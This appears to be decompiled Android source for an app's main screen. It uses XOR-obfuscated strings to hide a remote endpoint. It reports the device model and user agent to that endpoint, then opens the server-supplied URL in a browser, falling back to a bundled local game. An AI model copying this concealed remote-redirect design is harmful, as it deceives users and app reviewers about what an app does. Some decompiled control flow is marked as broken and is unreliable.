package com.fortuneodd.shadegrid;

import H.e;
import K.x0;
import K.z0;
import P0.c;
import Q0.h;
import T.u;
import W0.a;
import X0.d;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.fortuneodd.shadegrid.MainActivity;
import com.fortuneodd.shadegrid.R;
import e1.l;
import g.AbstractActivityC0138i;
import g.C0136g;
import g.C0137h;
import i1.m;
import i1.q;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.g;
import m1.j;
import n0.b;
import o0.C0276a;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0138i {

    /* renamed from: E, reason: collision with root package name */
    public static final /* synthetic */ int f1519E = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1520A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1521B;

    /* renamed from: C, reason: collision with root package name */
    public String f1522C;

    /* renamed from: D, reason: collision with root package name */
    public final c f1523D;

    /* renamed from: y, reason: collision with root package name */
    public final c f1524y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1525z;

    public MainActivity() {
        this.d.f2382b.e("androidx:appcompat", new C0136g(this));
        h(new C0137h(this));
        this.f1524y = new c(new a() { // from class: n0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1519E;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new C0276a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1525z = t(new byte[]{-94, 8, Byte.MIN_VALUE});
        this.f1520A = t(new byte[]{-77, 27, -107, -55});
        this.f1523D = new c(new b());
    }

    public static String t(byte[] bArr) {
        int[] iArr = {(int) 193, (int) 110, (int) 231, (int) 165};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        return new String(h.z0(arrayList), e1.a.f1917a);
    }

    /* JADX WARN: Code restructure failed: missing block: B:29:0x01d7, code lost:
    
        r3 = r4;
     */
    @Override // g.AbstractActivityC0138i, a.l, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1521B = getSharedPreferences(this.f1525z, 0);
        setContentView(((C0276a) this.f1524y.a()).f3339a);
        u();
        WebSettings settings = ((C0276a) this.f1524y.a()).f3340b.getSettings();
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        ((C0276a) this.f1524y.a()).f3340b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1521B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            d.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1520A, null);
        if (string != null && !e1.d.o0(string)) {
            this.f1522C = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{-2, 15, -105, -43, -4});
        d.d(getPackageName(), "getPackageName(...)");
        byte[] bArr = {-87, 26, -109, -43, -78, 84, -56, -118, -74, 7, -119, -47, -92, 28, -54, -61, -77, 1, -108, -47, -20, 90, -43, -57, -91, 64, -117, -36, -75, 24, -111, -46, -81, 13, -124, -120, -81, 15, -109, -64, -92, 89, -47, -117, -74, 1, -107, -50, -92, 28, -108, -117, -91, 11, -111, -118};
        int[] iArr = {(int) 193, (int) 110, (int) 231, (int) 165};
        ArrayList arrayList = new ArrayList(56);
        int i = 0;
        int i2 = 0;
        while (i < 56) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        String str = new String(h.z0(arrayList), e1.a.f1917a) + t2 + packageName;
        u uVar = new u(4);
        d.e(str, "url");
        if (l.g0(str, "ws:", true)) {
            String substring = str.substring(3);
            d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.g0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        d.e(str, "<this>");
        m mVar = new m();
        mVar.c(null, str);
        uVar.f750a = mVar.a();
        String t3 = t(new byte[]{-103, 67, -93, -64, -73, 7, -124, -64, -20, 35, -120, -63, -92, 2});
        String str2 = Build.MODEL;
        d.d(str2, "MODEL");
        uVar.l(t3, str2);
        uVar.l(t(new byte[]{Byte.MIN_VALUE, 13, -124, -64, -79, 26, -54, -23, -96, 0, Byte.MIN_VALUE, -48, -96, 9, -126}), t(new byte[]{-92, 0, -54, -16, -110, 66, -126, -53, -6, 31, -38, -107, -17, 87}));
        String t4 = t(new byte[]{-108, 29, -126, -41, -20, 47, Byte.MIN_VALUE, -64, -81, 26});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        uVar.l(t4, defaultUserAgent);
        e b2 = uVar.b();
        q qVar = (q) this.f1523D.a();
        qVar.getClass();
        j jVar = new j(qVar, b2);
        B.j jVar2 = new B.j(this, this.f1520A);
        if (!jVar.f3237e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3579a;
        jVar.f3238f = n.f3579a.g();
        u uVar2 = qVar.f2488a;
        g gVar3 = new g(jVar, jVar2);
        uVar2.getClass();
        synchronized (uVar2) {
            ((ArrayDeque) uVar2.f751b).add(gVar3);
            String str3 = ((i1.n) b2.f206c).d;
            Iterator it = ((ArrayDeque) uVar2.f752c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (d.a(((i1.n) gVar.f3231c.f3235b.f206c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) uVar2.f751b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (d.a(((i1.n) gVar.f3231c.f3235b.f206c).d, str3)) {
                        }
                    }
                }
            }
            if (gVar2 != null) {
                gVar3.f3230b = gVar2.f3230b;
            }
        }
        uVar2.r();
    }

    @Override // g.AbstractActivityC0138i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1522C;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        x0 x0Var;
        WindowInsetsController insetsController;
        q1.d.Q(getWindow(), false);
        Window window = getWindow();
        C.g gVar = new C.g(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            z0 z0Var = new z0(insetsController, gVar);
            z0Var.f456f = window;
            x0Var = z0Var;
        } else {
            x0Var = new x0(window, gVar);
        }
        x0Var.B();
        x0Var.W();
    }

    public final void v() {
        WebView webView = ((C0276a) this.f1524y.a()).f3340b;
        webView.setVisibility(0);
        webView.loadUrl(t(new byte[]{-89, 7, -117, -64, -5, 65, -56, -118, -96, 0, -125, -41, -82, 7, -125, -6, -96, 29, -108, -64, -75, 65, -114, -53, -91, 11, -97, -117, -87, 26, -118, -55}));
    }

    public final void w(String str) {
        ((C0276a) this.f1524y.a()).f3340b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
